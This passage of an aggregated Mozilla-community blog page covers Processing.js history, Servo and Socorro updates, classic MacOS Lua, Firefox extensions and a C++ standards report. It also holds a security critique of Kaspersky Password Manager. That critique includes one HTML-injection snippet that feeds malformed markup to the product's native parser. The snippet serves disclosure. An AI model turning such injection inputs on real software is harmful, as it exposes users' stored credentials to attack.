<p>This photo shows the proposed location for the 180 degree motion sensor "2" on the wall above the double door:</p>
<p><img src="sitting-dining-sensors-photo.jpg" /></p>
<h3>Summary</h3>
<p>To summarize, buy a <a href="https://zigate.fr/">Zigate</a> and a small number of products to start experimenting with.  Make an inventory of all the products potentially needed for your home.  Try to mark sensor locations on a floorplan, thinking about the type of sensor (or multiple sensors) you need for each space.</p>
</div></div></div></div></div><div class="permalink"><a href="https://danielpocock.com/smart-home-where-to-start">by Daniel.Pocock at <time datetime="2018-12-03T08:44:33Z" title="December 03, 2018 08:44 AM GMT">‰∏ãÂçà4:44:33</time></a></div></div><div class="news david-humphrey"><a id="news-56"></a><h3><a href="https://blog.humphd.org/" title="mozilla - Bread &amp; Circuits">David Humphrey</a> ‚Äî <a href="https://blog.humphd.org/processing-js-2008/">Processing.js 2008-2018</a></h3><div class="entry"><div class="content"><div class="kg-card-markdown"><p>Yesterday <a href="https://twitter.com/TheRealPomax">Pomax</a> DM'ed me on Twitter to let me know he'd <a href="https://twitter.com/TheRealPomax/status/1068942375970435073">archived the Processing.js GitHub repo</a>.  He's been maintaining it mostly on his own for quite a while, and now with the amazing <a href="https://p5js.org/">p5js</a> project, there isn't really a need to keep it going.</p>
<p>I spent the rest of the day thinking back over the project, and reflecting on what it meant to me.  Like <a href="https://johnresig.com/blog/processingjs-aftermath/">everyone else</a> in May 2008, I was in awe when John Resig wrote his famous <a href="https://johnresig.com/blog/processingjs/">reverse birthday present blog post</a>, showing the world what he'd been hacking together:</p>
<blockquote>
<p>I've decided to release one of my largest projects, in recent memory. Processing.js is the project that I've been alluding to for quite some time now. I've ported the Processing visualization language to JavaScript, using the Canvas element. I've been working on this project, off-and-on now, for the past 7 months.</p>
</blockquote>
<p>It was nothing short of epic.  I had followed the development of Processing since I was an undergrad.  I remember stumbling into the <a href="http://acg.media.mit.edu/">aesthetics + computation group</a> website at MIT in my first year, and becoming aware of the work of <a href="http://acg.media.mit.edu/people/fry/">Ben Fry</a>, <a href="http://plw.media.mit.edu/people/maeda/">John Maeda</a>, <a href="http://acg.media.mit.edu/people/creas/">Casey Reas</a> and others.  I was smitten.  As a student studying both humanities and CS, I didn't know anyone else who loved computers <em>and</em> art, and here was an entire lab devoted to it.  For many years thereafter, I followed along from afar, always amazed at the work people there were doing.</p>
<p>Then, in the fall of 2009, as part of my work with Mozilla, <a href="https://en.wikipedia.org/wiki/Christopher_Blizzard">Chris Blizzard</a> approached me about helping Al MacDonald (f1lt3r) to work on getting Processing.js to 1.0, and adding the missing 3D API via WebGL.  In the lead-up to Firefox 3.7, Mozilla was interested in getting more canvas based tech on the web, and in finding performance and other bugs in canvas and WebGL.  Processing.js, they thought, would help to bring a community of artists, designers, educators, and other visual coders to the web.</p>
<p>Was I interested!?  Here was a chance to finally work alongside some of my technical heroes, and to get to contribute to a space I'd only ever looked at from the other side of the glass.  "Yes, I'm interested."  I remember getting my first email from Ben, who started to explain what Processing was--I didn't need any introductions.</p>
<p>That term I used Processing.js as the main open source project in my open source class.  As Al and I worked on the code, I taught the students how things worked, and got them fixing small bugs.  The code was not the easiest first web project for students: take a hybrid of Java and make it work, unmodified, in the browser, using DOM and canvas APIs.  This was before transpilers, node, and the current JS ecosystem.  If you want to learn the web though, there was no better way than to come at it from underneath like this.</p>
<p>I had an energetic group of students with a nice set of complimentary skills.  A few had been working with <a href="https://twitter.com/vvuk">Vlad</a> on 3D in the browser for a while, as he developed what would become WebGL.  Andor Salga, Anna Sobiepanek, Daniel Hodgin, Scott Downe, Jon Buckley, and others would go on to continue working on it with me in our open source lab, CDOT.</p>
<p>Through 2009-11 we worked using the methods I'd learned from Mozilla: open bug tracker, irc, blogs, wikis, weekly community calls, regular dot-releases.</p>
<p>Because we were working in the open, and because the project had such an outsized reputation thanks to the intersections of "Ben &amp; Casey" and Resig, all kinds of random (and amazing) people showed up in our irc channel.  Every day someone new from the who's who of design, graphics, gaming, and the digital art worlds would pop in to show us a demo that had a bug, or to ask a question about how to make something work.  I spent most of my time helping people debug things, and writing tests to put back into the project for performance issues, parser bugs, and API weirdness.</p>
<p>One day a musician and digital artist named <a href="https://github.com/corbanbrook">Corban Brook</a> showed up.  He used Processing in his work, and was interested to help us fix some things he'd found while porting an old project.  He never left.  Over the months he'd help us rewrite huge amounts of the code, taught us git, and become a big brother to many of the students.  I learned a ton from him about git and JS.</p>
<p>Then there was the time this mathematician came into the channel, complaining about how poor our font code and bezier curve implementation.  It turned out <a href="https://pomax.github.io/bezierinfo/">he knew what he was talking about</a>, and we never let him leave either.  Pomax would go on to become one of the most important maintainers on the project, and a long time friend.</p>
<p>Another time an unknown nickname, "notmasteryet," appeared.  He started submitting massive pull requests, but never really said anything.  At one point he rewrote our entire Java-to-JavaScript parser from scratch and magically fixed hundreds of bugs we couldn't solve.  "notmasteryet" turned out to be <a href="https://github.com/yurydelendik">Yury Delendik</a>, who would go on to join Mozilla and build every cool thing you've seen the web do in the past 10 years (<a href="https://github.com/mozilla/pdf.js">pdf.js</a>, <a href="https://github.com/mozilla/shumway">shumway</a> to name a few).</p>
<p>Being part of this eclectic mix of hackers and artists was intoxicating.  Whatever skill one of you lacked, others in the group had it.  At one point, the conversation moved toward how to use the browser to mix audio and visuals with processing.js.  I had no idea how sound worked, but I did understand how to hack into Gecko and get the data, Corban was a master with FFTs, Al knew how to make the visuals work, and Yury knew everything the rest of us didn't.</p>
<p>We <a href="https://blog.humphd.org/vocamus-914/">set out to see if we could connect all the dots</a>, and began hacking on a new branch of our code that used a version of Firefox I modified to emit audio events.  Our work would eventually be shipped in Firefox 4 as the <a href="https://wiki.mozilla.org/Audio_Data_API">Audio Data API</a>, and lead to what is now the <a href="https://blog.humphd.org/vocamus-1626/">standardization of the Web Audio AI</a>.  I still remember the first time we got all of our pieces working together in the browser, and <a href="https://vimeo.com/8525101">Corban filmed it</a>.  Magic!</p>
<p>From there the group only got larger, and the ideas for processing.js more ambitious.  With the addition of people like <a href="https://twitter.com/ccliffe">CJ</a> and <a href="https://twitter.com/secretrobotron">Bobby</a>, we started <a href="https://www.youtube.com/watch?v=1Uw0CrQdYYg">building big demos for Mozilla</a>, which doubled as massive performance tests for browsers trying to compete for speed with WebGL: <a href="https://www.youtube.com/watch?v=rSSf_umjOgU">Flight of the Navigator</a>, <a href="https://www.youtube.com/watch?v=FsTXlcENeVo">No Comply</a>.  And these led to yet more browser APIs for gaming, like <a href="https://blog.humphd.org/vocamus-1393/">Pointer Lock</a> and <a href="https://www.w3.org/TR/gamepad/">Gamepad</a>.</p>
<p>Since then it's been amazing to watch all the places that processing.js has gone.  Twitter has always been full of people discovering it, and sharing their work, not least because of <a href="https://www.khanacademy.org/computer-programming/new/pjs">John and Khan Academy using it there in their curriculum</a>.  Years later, I even got to use it there <a href="https://blog.humphd.org/vocamus-1632/">with my own children</a> to teach them to code.</p>
<p>I truly loved working on processing.js, probably more than any other project I've done in the past 10 years.  It was my favourite kind of software to build for a few reasons:</p>
<ul>
<li>we were implementing Ben's spec.  All of our tests and decisions were based on "what does p5 do?"  The freedom not to have to decide, but to simply execute, was liberating.</li>
<li>we had an enormous amount of pre-existing code to test, and slowly make work.  There's no way I could have built processing.js from zero.  But I love porting everyone's existing projects.</li>
<li>the project was <a href="https://blog.humphd.org/vocamus-984/">totally based on tests</a>: unit tests, performance tests, visual snapshot/ref tests, parser tests.  I learned how to think about code in terms of tests by working on Mozilla, but I learned to love tests through processing.js</li>
<li>it could be run without installing anything.  Every time we made something new work, you just had to hit Refresh in your browser.  That sounds so obvious, but for the community of Java devs coming to the web via processing.js, it was eye opening.</li>
<li>we could put time and attention into <a href="http://processingjs.org/reference/">docs, examples, and guides</a>.  Casey and Ben had done so much of this, and we learned a lot from his approach and style.</li>
<li>it let me move up and down the web stack.  I spent as much time working on performance issues in Firefox as I did in JavaScript.  We found a ton of things in WebGL (I was even able to find and get a security bounty for a bug with TypedArrays).  I remember once sitting with Boris Zbarsky in Boston, and having him teach me, slowly, how to figure out why our code was falling off of the JIT tracing, and how to fix it.  Eventually we got back on JIT, thanks to bz :)</li>
</ul>
<p>While it's definitely time for processing.js to be archived and other projects to take its place, I wanted to at least say a proper goodbye.  I'm thankful I got to spend so many years working in the middle of it, and to have had the chance to work with such a creative part of the internet.</p>
<p>Thanks, too, to Pomax for keeping the lights on years after the rest of us had gone to other projects.</p>
<p>And to processing.js, goodnight.  Thanks for all the unit tests.</p>
</div></div></div><div class="permalink"><a href="https://blog.humphd.org/processing-js-2008/">by David Humphrey at <time datetime="2018-12-03T04:12:00Z" title="December 03, 2018 04:12 AM GMT">‰∏ãÂçà12:12:00</time></a></div></div><div class="news the-servo-blog"><a id="news-57"></a><h3><a href="https://blog.servo.org/" title="Servo Blog">The Servo Blog</a> ‚Äî <a href="https://blog.servo.org/2018/12/03/twis-120/">This Week In Servo 120</a></h3><div class="entry"><div class="content"><p>In the <a href="https://github.com/pulls?utf8=%E2%9C%93&amp;q=is%3Apr+is%3Amerged+closed%3A2018-11-26..2018-12-03+user%3Aservo+">past week</a>,
we merged 78 PRs in the Servo organization‚Äôs repositories.</p>

<h3 id="planning-and-status">Planning and Status</h3>

<p>Our <a href="https://github.com/servo/servo/wiki/Roadmap">roadmap</a> is available online, including the overall plans for 2018.</p>

<p>This week‚Äôs status updates are <a href="https://build.servo.org/standups/">here</a>.</p>

<h3 id="notable-additions">Notable Additions</h3>

<ul>
  <li>danlrobertson <a href="https://github.com/servo/ipc-channel/pull/153">added</a> a bunch of documentation to the <code class="highlighter-rouge">ipc-channel</code> crate.</li>
  <li>myfreeweb <a href="https://github.com/servo/gaol/pull/39">added</a> FreeBSD support to the <code class="highlighter-rouge">gaol</code> crate.</li>
  <li>gterzian <a href="https://github.com/servo/servo/pull/21673">implemented</a> a background hang monitor that reports the hung backtrace.</li>
  <li>ferjm <a href="https://github.com/servo/servo/pull/22134">made</a> blob URLs support range requests.</li>
  <li>Darkspirit <a href="https://github.com/servo/servo/pull/22254">updated</a> the SSL certificate generation mechanism.</li>
  <li>nox <a href="https://github.com/servo/servo/pull/22277">worked around</a> a Cargo bug causing unnecessarily long rebuilds when switching between build targets.</li>
  <li>CYBAI <a href="https://github.com/servo/servo/pull/22278">enabled</a> the automated Service Worker testsuite.</li>
  <li>Manishearth <a href="https://github.com/servo/rust-webvr/pull/28">fixed</a> some <a href="https://github.com/servo/servo/pull/22317">bugs</a> preventing WebVR from working in Google Daydream.</li>
  <li>ferjm <a href="https://github.com/servo/media/pull/167">suppressed</a> a crash when playing media while GStreamer is not installed correctly.</li>
  <li>asajeffrey <a href="https://github.com/servo/servo/pull/22316">improved</a> the Magic Leap UI some more.</li>
  <li>jdm <a href="https://github.com/servo/servo/pull/22336">fixed</a> a bug causing some cached images to not be displayed correctly.</li>
  <li>jdm <a href="https://github.com/servo/servo/pull/22340">avoided</a> an issue with reading certain HTTP responses from the cache leading to blank pages.</li>
</ul>

<h3 id="new-contributors">New Contributors</h3>

<ul>
  <li>Shubham Kumaram</li>
</ul>

<p>Interested in helping build a web browser? Take a look at our <a href="https://starters.servo.org/">curated list</a> of issues that are good for new contributors!</p></div></div><div class="permalink"><a href="https://blog.servo.org/2018/12/03/twis-120/">by The Servo Blog at <time datetime="2018-12-03T00:30:00Z" title="December 03, 2018 12:30 AM GMT">‰∏äÂçà8:30:00</time></a></div></div><h2><time datetime="2018-12-02">Sunday, 2 December 2018</time></h2><div class="news nick-fitzgerald"><a id="news-58"></a><h3><a href="http://fitzgeraldnick.com/" title="Nick Fitzgerald">Nick Fitzgerald</a> ‚Äî <a href="http://fitzgeraldnick.com/2018/12/02/wasm-bindgen-how-does-it-work.html">wasm-bindgen ‚Äî how does it work?!</a></h3><div class="entry"><div class="content"><p>A month or so ago I gave a presentation on the inner workings of
<a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to the <a href="https://www.w3.org/community/webassembly/">WebAssembly Community Group</a>. A
particular focus was the way that <code>wasm-bindgen</code> is forward-compatible with, and
acts as a sort of polyfill for, the <a href="https://github.com/WebAssembly/host-bindings/blob/master/proposals/host-bindings/Overview.md">host bindings proposal</a>. A lot of this
material was originally supposed to appear in <a href="http://fitzgeraldnick.com/2018/10/01/sfhtml5-rust-and-wasm-talk.html">my SFHTML5 presentation</a>, but
time constraints forced me to cut it out.</p>

<p>Unfortunately, the presentation was not recorded, but you can view the slide
deck below, or <a href="https://fitzgen.github.io/wasm-cg-wasm-bindgen/#1" target="_top">open it in a new window.</a> Navigate between slides with arrow
keys or space bar.</p></div></div><div class="permalink"><a href="http://fitzgeraldnick.com/2018/12/02/wasm-bindgen-how-does-it-work.html">by Nick Fitzgerald at <time datetime="2018-12-02T08:00:00Z" title="December 02, 2018 08:00 AM GMT">‰∏ãÂçà4:00:00</time></a></div></div><h2><time datetime="2018-12-01">Saturday, 1 December 2018</time></h2><div class="news will-kahn-greene" xml:lang="en"><a id="news-59"></a><h3><a href="https://bluesock.org/~willkg/blog/" title="Will's blog">Will Kahn-Greene</a> ‚Äî <a href="https://bluesock.org/~willkg/blog/mozilla/socorro_2018_11.html">Socorro: November 2018 happenings</a></h3><div class="entry"><div class="content"><div class="section" id="summary">
<h3>Summary</h3>
<p><a class="reference external" href="https://github.com/mozilla-services/socorro">Socorro</a> is the crash ingestion
pipeline for Mozilla's products like Firefox. When Firefox crashes, the Breakpad
crash reporter asks the user if the user would like to send a crash report. If
the user answers "yes!", then the Breakpad crash reporter collects data related
to the crash, generates a crash report, and submits that crash report as an HTTP
POST to Socorro. Socorro saves the crash report, processes it, and provides an
interface for aggregating, searching, and looking at crash reports.</p>
<p>November was another busy month! This blog post covers what happened.</p>
<p><a href="https://bluesock.org/~willkg/blog/mozilla/socorro_2018_11.html">Read more‚Ä¶</a> (5 mins to read)</p></div></div></div><div class="permalink"><a title="Contents ¬© 2018 Will Kahn-Greene CC BY-SA 3.0">¬©</a> <a href="https://bluesock.org/~willkg/blog/mozilla/socorro_2018_11.html">Will Kahn-Greene at <time datetime="2018-12-01T14:00:00Z" title="December 01, 2018 02:00 PM GMT">‰∏ãÂçà10:00:00</time></a></div></div><div class="news cameron-kaiser"><a id="news-60"></a><h3><a href="http://tenfourfox.blogspot.com/" title="TenFourFox Development">Cameron Kaiser</a> ‚Äî <a href="http://tenfourfox.blogspot.com/2018/11/something-for-weekend-classic-macos-lua.html">Something for the weekend: Classic MacOS Lua</a></h3><div class="entry"><div class="content">First, a TenFourFox FPR11 update: the release is delayed until December 10-ish to coincide with the updated release date of Firefox 66/60.4 ESR. Unfortunately due to my absence over the holidays this leaves very little development time for FPR12 in December, so the beta is not likely to emerge until mid-January. <a href="https://github.com/classilla/tenfourfox/issues/533">Issue 533</a> ("<tt>this is undefined</tt>") is still my biggest priority because of the large number of sites still using the tainted version of Uglify-ES, but I still have no solution figured out yet, and the 15-minutes-or-longer build time to reconstruct test changes in JavaScript if I touch any headers seriously slows debugging. If you've had issues with making new shipments in United Parcel Service's on-line shipping application, or getting into your Citibank account, this is that bug. <p>So in the meantime, since we're all classic Mac users here, try out <a href="https://github.com/SolraBizna/MacLua5.3/releases">MacLua</a>, a new port of the <a href="https://www.lua.org/">Lua programming language</a> to classic MacOS. I'm rather fond of Lua, which is an incredibly portable scripting language, ever since I learned it to write PalmOS applications in Plua (I maintained <a href="https://www.floodgap.com/software/macplua/">the Mac OS X cross-compiler</a> for it). In fact, I still use Plua for <a href="http://tenfourfox.blogspot.com/2014/12/and-now-for-something-completely.html">my PalmOS-powered Hue light controller</a>. </p><p>MacLua gives you a REPL which you can type Lua into and will run your Lua scripts, but it has two interesting features: first, you can use it as an <a href="https://en.wikipedia.org/wiki/Macintosh_Programmer's_Workshop">MPW tool</a>, and second, it allows plugins that could potentially connect it to the rest of the classic Mac Toolbox. The only included component is a simple one for querying Gestalt as an educational example, but a component for TCP sockets through MacTCP or OpenTransport or being able to display dialogue boxes and other kinds of system resources would seem like a logical next step. This was something really nice about Plua that it included GUI and network primitives built-in as included modules. The author of this port clearly has a similar idea in mind. </p><p>You can still compile Lua natively on 10.4, and that would probably be more useful if you wanted to write Lua scripts on an OS X Power Mac, but if you have a 68K or beige Power Mac around this Lua port can run on systems as early as 7.1.2 (probably any 68020 System 7 Mac if you install the CFM-68K Runtime Enabler). I look forward to seeing how it evolves, and the fact that it was built with QEMU as a Mac emulator not only is good evidence of how functional QEMU's classic Mac emulation is getting but also means there may be a chance at some other ports to the classic Mac OS in the future.</p></div></div><div class="permalink"><a href="http://tenfourfox.blogspot.com/2018/11/something-for-weekend-classic-macos-lua.html">by ClassicHasClass at <time datetime="2018-11-30T23:50:00Z" title="November 30, 2018 11:50 PM GMT">‰∏äÂçà7:50:00</time></a></div></div><div class="news mozilla-addons-blog" xml:lang="en-US"><a id="news-61"></a><h3><a href="https://blog.mozilla.org/addons" title="Mozilla Add-ons Blog">Mozilla Addons Blog</a> ‚Äî <a href="https://blog.mozilla.org/addons/2018/11/30/decembers-featured-extensions-2/">December‚Äôs Featured Extensions</a></h3><div class="entry"><div class="content"><p><img alt="Firefox Logo on blue background" class="alignleft size-medium wp-image-7684" src="screen-shot-2018-01-03-at-5.18.17-pm-1.png" width="252" height="252" /></p>
<h3>Pick of the Month: <a href="https://addons.mozilla.org/firefox/addon/full-screen-for-firefox/?utm_source=blog.mozilla.org&amp;utm_medium=post&amp;utm_campaign=2018-12-featured" rel="noopener" target="_top">Full Screen for Firefox</a></h3>
<p><strong>by</strong> <a href="https://addons.mozilla.org/firefox/user/Stefanvd/?utm_source=blog.mozilla.org&amp;utm_medium=post&amp;utm_campaign=2018-12-featured" rel="noopener" target="_top">Stefan vd</a><br />
Go full screen with a single click. </p>
<p><em>‚ÄúThis is what I was searching for and now I have it!‚Äù</em></p>
<h3>Featured: <a href="https://addons.mozilla.org/firefox/addon/contextual-search/?utm_source=blog.mozilla.org&amp;utm_medium=post&amp;utm_campaign=2018-12-featured" rel="noopener" target="_top">Context Search</a></h3>
<p><strong>by</strong> <a href="https://addons.mozilla.org/firefox/user/odebroqueville/?utm_source=blog.mozilla.org&amp;utm_medium=post&amp;utm_campaign=2018-12-featured" rel="noopener" target="_top">Olivier de Broqueville</a><br />
Search highlighted text on any web page using your preferred search engine. Just right-click (or Shift-click) on the text to launch the context menu. You can also perform searches using keywords in the URL address bar.</p>
<p><em>‚ÄúGreat add-on and very helpful! Thank you for the good work.‚Äù</em></p>
<h3>Featured: <a href="https://addons.mozilla.org/firefox/addon/behind-the-overlay-revival/?utm_source=blog.mozilla.org&amp;utm_medium=post&amp;utm_campaign=2018-12-featured" rel="noopener" target="_top">Behind the Overlay Revival</a></h3>
<p><strong>by</strong> <a href="https://addons.mozilla.org/firefox/user/ivanruvalcaba/?utm_source=blog.mozilla.org&amp;utm_medium=post&amp;utm_campaign=2018-12-featured" rel="noopener" target="_top">Iv√°n Ruvalcaba</a><br />
Simply click a button to close annoying pop-up overlays. </p>
<p><em>‚ÄúI don‚Äôt think I‚Äôve ever reviewed an extension, but man, what a find. I get very sick of closing overlays and finding the little ‚Äòx‚Äô in some corner of it or some light colored ‚Äòclose‚Äô link. They get sneakier and sneakier about making you actually read the overlay to find a way to close it. Now when I see one, I know right away I can click on the X in the toolbar and it will disappear. So satisfying.‚Äù</em></p>
<p>If you‚Äôd like to nominate an extension for featuring, please send it to <strong>amo-featured [at] mozilla [dot] org</strong> for the board‚Äôs consideration. We welcome you to submit your own add-on!</p>
<p>The post <a href="https://blog.mozilla.org/addons/2018/11/30/decembers-featured-extensions-2/" rel="nofollow">December‚Äôs Featured Extensions</a> appeared first on <a href="https://blog.mozilla.org/addons" rel="nofollow">Mozilla Add-ons Blog</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/addons/2018/11/30/decembers-featured-extensions-2/">by Scott DeVaney at <time datetime="2018-11-30T20:50:16Z" title="November 30, 2018 08:50 PM GMT">‰∏äÂçà4:50:16</time></a></div></div><div class="news wladimir-palant" xml:lang="en-us"><a id="news-62"></a><h3><a href="https://palant.de/" title="Wladimir Palant's notes - mozilla - gecko - security">Wladimir Palant</a> ‚Äî <a href="https://palant.de/2018/11/30/maximizing-password-manager-attack-surface-leaning-from-kaspersky">Maximizing password manager attack surface: Learning from Kaspersky</a></h3><div class="entry"><div class="content"><p>I looked at a number of password manager browser extensions already, and most of them have <a href="https://palant.de/2018/08/29/password-managers-please-make-sure-autofill-is-secure">some obvious issues</a>. Kaspersky Password Manager manages to stand out in the crowd however, the approach taken here is rather unique. You know how browser extensions are rather tough to exploit, with all that sandboxed JavaScript and <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/content_security_policy">restrictive default content security policy</a>? Clearly, all that is meant for weaklings who don‚Äôt know how to write secure code, not the pros working at Kaspersky.</p>

<p>Kaspersky developers don‚Äôt like JavaScript, so they hand over control to their beloved C++ code as soon as possible. No stupid sandboxing, code is running with the privileges of the logged in user. No memory safety, dealing with buffer overflows is up to the developers. How they managed to do it? Browser extensions have that escape hatch called <a href="https://developer.chrome.com/extensions/nativeMessaging">native messaging</a> which allows connecting to an executable running on the user‚Äôs system. And that executable is what contains most of the logic in case of the Kaspersky Password Manager, with the browser extension being merely a dumb shell.</p>

<p>The extension uses website events to communicate with itself. As in: code running in the same scope (content script) uses events instead of direct calls. While seemingly pointless, this approach has a crucial advantage: it allows websites to mess with the communication and essentially make calls into the password manager‚Äôs executable. Because, if this communication channel weren‚Äôt open to websites, how could the developers possibly prove that they are capable of securing their application?</p>

<p>Now I‚Äôm pretty bad at reverse engineering binary code. But I managed to identify large chunks of custom-written code that can be triggered by websites more or less directly:</p>

<ul>
	<li><span class="caps">JSON</span> parser</li>
	<li><span class="caps">HTML</span> parser</li>
	<li>Neuronal network</li>
</ul>

<p>While the <span class="caps">JSON</span> parser is required by the native messaging protocol, you are probably wondering what the other two chunks are doing in the executable. After all, the browser already has a perfectly capable <span class="caps">HTML</span> parser. But why rely on it? Analyzing page structure to recognize login forms would have been too easy in the browser. Instead, the browser extension serializes the page back to <span class="caps">HTML</span> (with some additional attributes, e.g. to point out whether a particular field is visible) and sends it to the executable. The executable parses it, makes the neuronal network analyze the result and tells the extension which fields need to be filled with what values.</p>

<p>Doesn‚Äôt sound like proper attack surface maximization because serialized <span class="caps">HTML</span> code will always be well-formed? No problem, the <span class="caps">HTML</span> parser has its limitations. For example, it doesn‚Äôt know <a href="https://en.wikipedia.org/wiki/Processing_Instruction"><span class="caps">XML</span> processing instructions</a> and will treat them like regular tags. And <code>document.createProcessingInstruction("foo", "&gt;&lt;script/src=x&gt;")</code> is serialized as <code>&lt;?foo &gt;&lt;script/src=x&gt;?&gt;</code>, so now the <span class="caps">HTML</span> parser will be processing <span class="caps">HTML</span> code that is no longer well-formed.</p>

<p>This was your quick overview, hope you learned a thing or two about maximizing the attack surface. Of course, you should only do that if you are a real pro and aren‚Äôt afraid of hardening your application against attacks!</p></div></div><div class="permalink"><a href="https://palant.de/2018/11/30/maximizing-password-manager-attack-surface-leaning-from-kaspersky">by Wladimir Palant at <time datetime="2018-11-30T20:15:16Z" title="November 30, 2018 08:15 PM GMT">‰∏äÂçà4:15:16</time></a></div></div><h2><time datetime="2018-11-30">Friday, 30 November 2018</time></h2><div class="news botond-ballo" xml:lang="en"><a id="news-63"></a><h3><a href="https://botondballo.wordpress.com/" title="mozilla ‚Äì There's Waldo!">Botond Ballo</a> ‚Äî <a href="https://botondballo.wordpress.com/2018/11/30/trip-report-c-standards-meeting-in-san-diego-november-2018/">Trip Report: C++ Standards Meeting in San Diego, November 2018</a></h3><div class="entry"><div class="content"><h3><strong>Summary / TL;DR</strong></h3>
<strong><p></p>
</strong><p>  </p><p>  &lt;!‚Äì</p><p>‚Äì&gt;</p><table>
  <tbody><tr>
<td><strong>Project</strong></td>
<td><strong>What‚Äôs in it?</strong></td>
<td><strong>Status</strong></td>
</tr>

<tr>
<td>C++17</td>
<td>See <a href="https://github.com/tvaneerd/cpp17_in_TTs/blob/master/ALL_IN_ONE.md">list</a></td>
<td><a href="https://www.iso.org/standard/68564.html">Published!</a></td>
</tr>
<tr>
<td>C++20</td>
<td>See <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#cxx20">below</a></td>
<td>On track</td>
</tr>
<tr>
<td>Library Fundamentals TS v3</td>
<td>See <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#lfts">below</a></td>
<td>Under active development</td>
</tr>
<tr>
<td>Concepts TS</td>
<td>Constrained templates</td>
<td>Merged into C++20, <strong>including (now) abbreviated function templates!</strong></td>
</tr>
<tr>
<td>Parallelism TS v2</td>
<td>Task blocks, library vector types and algorithms, and more</td>
<td>Published!</td>
</tr>
<tr>
<td>Executors</td>
<td>Abstraction for where/how code runs in a concurrent context</td>
<td>Subset headed for C++20, rest in C++23</td>
</tr>

<tr>
<td>Concurrency TS v2</td>
<td>See <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#concurrency-v2">below</a></td>
<td>Under development. Depends on Executors.</td>
</tr>

<tr>
<td>Networking TS</td>
<td>Sockets library based on Boost.ASIO</td>
<td><a href="https://www.iso.org/standard/64030.html">Published!</a> Not headed for C++20.</td>
</tr>
<tr>
<td>Ranges TS</td>
<td>Range-based algorithms and views</td>
<td><strong>Merged into C++20!</strong></td>
</tr>
<tr>
<td>Coroutines TS</td>
<td>Resumable functions, based on Microsoft‚Äôs <code>await</code> design</td>
<td><a href="https://www.iso.org/standard/73008.html">Published!</a> C++20 merge uncertain</td>
</tr>
<tr>
<td>Modules v1</td>
<td>A component system to supersede the textual header file inclusion model</td>
<td><a>Published as a TS</a></td>
</tr>
<tr>
<td>Modules v2</td>
<td>Improvements to Modules v1, including a better transition path</td>
<td><strong>On track to be merged into C++20</strong></td>
</tr><tr>
<td>Numerics TS</td>
<td>Various numerical facilities</td>
<td>Under active development</td>
</tr>
<tr>
<td>Graphics TS</td>
<td>2D drawing API</td>
<td>Future uncertain</td>
</tr>
<tr>
<td>Reflection TS</td>
<td>Static code reflection mechanisms</td>
<td>PDTS ballot underway; publication expected in early 2019</td>
</tr>
</tbody></table>
<p><em>A few links in this blog post may not resolve until the committee‚Äôs post-meeting mailing is published (expected any day now). If you encounter such a link, please check back in a few days.</em></p>
<h3><strong>Introduction</strong></h3>
<p>A few weeks ago I attended a meeting of the <a href="http://botondballo.wordpress.com/tag/mozilla/feed/www.open-std.org/jtc1/sc22/wg21/">ISO C++ Standards Committee</a> (also known as <strong>WG21</strong>) in San Diego, California. This was the third committee meeting in 2018; you can find my reports on preceding meetings <a href="https://botondballo.wordpress.com/2018/06/20/trip-report-c-standards-meeting-in-rapperswil-june-2018/">here (June 2018, Rapperswil)</a> and <a href="https://botondballo.wordpress.com/2018/03/28/trip-report-c-standards-meeting-in-jacksonville-march-2018/">here (March 2018, Jacksonville)</a>, and earlier ones linked from those. These reports, particularly the Rapperswil one, provide useful context for this post.</p>
<p>This meeting broke records (by a significant margin) for both attendance (~180 people) and number of proposals submitted (~270). I think several factors contributed to this. First, the meeting was in California, for the first time in the five years that I‚Äôve been attending meetings, thus making it easier to attend for Bay Area techies who weren‚Äôt up for farther travels. Second, we are at the phase of the C++20 cycle where the door is closing for new proposals targeting to C++20, so for people wanting to get features into C++20, it was now or never. Finally, there has been a general trend of growing interest in participation in C++ standardization, and thus attendance has been rising even independently of other factors.</p>
<p>This meeting was heavily focused on C++20. As discussed in the committee‚Äôs <a href="http://wg21.link/p1000r1">standardization schedule</a> document, this was the last meeting to hear new proposals targeting C++20, and the last meeting for language features with significant library impact to gain design approval. A secondary focus was on in-flight Technical Specifications, such as Library Fundamentals v3.</p>
<p>To accommodate the unprecedented volume of new proposals, there has also been a procedural change at this meeting. Two new subgroups were formed: <strong>Evolution Incubator</strong> (‚ÄúEWGI‚Äù) and <strong>Library Evolution Incubator</strong> (‚ÄúLEWGI‚Äù), which would look at new proposals for language and library changes (respectively) before forwarding them to the Evolution or Library Evolution Working Groups (EWG and LEWG). The main purpose of the incubators is to reduce the workload on the main Evolution groups by pre-filtering proposals that need additional work before being productively reviewed by those groups. A secondary benefit was to allow the attendees to be spread out across more groups, as otherwise EWG and LEWG would have likely exceeded their room capacities.</p>
<h3 id="cxx20"><strong>C++20</strong></h3>
<p>Here are the new changes voted into C++20 Working Draft at this meeting. For a list of changes voted in at previous meetings, see my <a href="https://botondballo.wordpress.com/2018/06/20/trip-report-c-standards-meeting-in-rapperswil-june-2018/">Rapperswil report</a>.</p>
<ul>
<li>Language:
<ul>
<li><a href="http://wg21.link/p1141"><strong>Abbreviated function templates</strong></a> (AFTs). After years of design iteration, AFTs finally gained consensus and will be shipped as part of C++20 along with the rest of Concepts. I discuss the consensus design <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#concepts">below</a>.</li>
<li><a href="http://wg21.link/p1084">Improvements to <em>return-type-requirements</em></a>.</li>
<li><a href="http://wg21.link/p1073">Immediate functions</a>. These are functions that can <em>only</em> be called during constant evaluation (i.e. at compile time).</li>
<li><a href="http://wg21.link/p0595"><code>std::is_constant_evaluated()</code></a></li><a href="http://wg21.link/p0595">
</a><li><a href="http://wg21.link/p0595"></a><a href="http://wg21.link/p1002"><code>try</code> / <code>catch</code> blocks in <code>constexpr</code> functions</a>.</li>
<li><a href="http://wg21.link/p1327">Allowing <code>dynamic_cast</code> and polymorphic <code>typeid</code> in constant expressions.</a></li><a href="http://wg21.link/p1327">
</a><li><a href="http://wg21.link/p1327"></a><a href="http://wg21.link/p1330">Changing the active member of a union inside <code>constexpr</code></a></li><a href="http://wg21.link/p1330">
